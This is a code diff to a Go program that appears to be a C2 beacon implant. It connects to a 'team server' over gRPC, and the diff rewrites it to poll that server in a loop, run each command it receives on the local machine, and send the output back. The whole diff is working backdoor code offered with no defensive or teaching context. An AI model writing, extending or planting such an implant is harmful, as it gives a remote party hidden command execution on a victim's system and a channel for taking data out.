@@ -21,7 +21,7 @@ func main() {
 		conn         *grpc.ClientConn
 		err          error
 		beaconClient grpcapi.BeaconClient
-		cmdline      *grpcapi.Command
+		grpcCmd      *grpcapi.Command
 	)
 
 	// 1. connect to the team server
@@ -36,20 +36,22 @@ func main() {
 
 	// begin polling
 	context := context.Background()
-	req := new(grpcapi.Empty)
-	cmdline, err = beaconClient.FetchCommand(context, req)
-	{
+	for {
+		req := new(grpcapi.Empty)
+		grpcCmd, err = beaconClient.FetchCommand(context, req)
 		if err != nil {
 			log.Fatalf("beaconClient.FetchCommand: %v", err)
 		}
 
-		if "" == cmdline.In {
+		if "" == grpcCmd.In {
 			// no work
 			log.Print("no work")
+		} else if "q" == grpcCmd.In {
+			break
 		}
 		// execute the cmdline from team server
 		var cmd *exec.Cmd
-		cmds := strings.Split(cmdline.In, " ")
+		cmds := strings.Split(grpcCmd.In, " ")
 		if 1 == len(cmds) {
 			cmd = exec.Command(cmds[0])
 		} else {
@@ -59,11 +61,11 @@ func main() {
 		var arrBytesRes []byte
 		arrBytesRes, err = cmd.CombinedOutput()
 		if nil != err {
-			cmdline.Out = err.Error()
+			grpcCmd.Out = err.Error()
 		}
-		cmdline.Out += string(arrBytesRes)
-		beaconClient.SendResult(context, cmdline)
-		log.Printf("response: %s", cmdline.Out)
+		grpcCmd.Out += string(arrBytesRes)
+		beaconClient.SendResult(context, grpcCmd)
+		log.Printf("response: %s", grpcCmd.Out)
 
 	}
 }
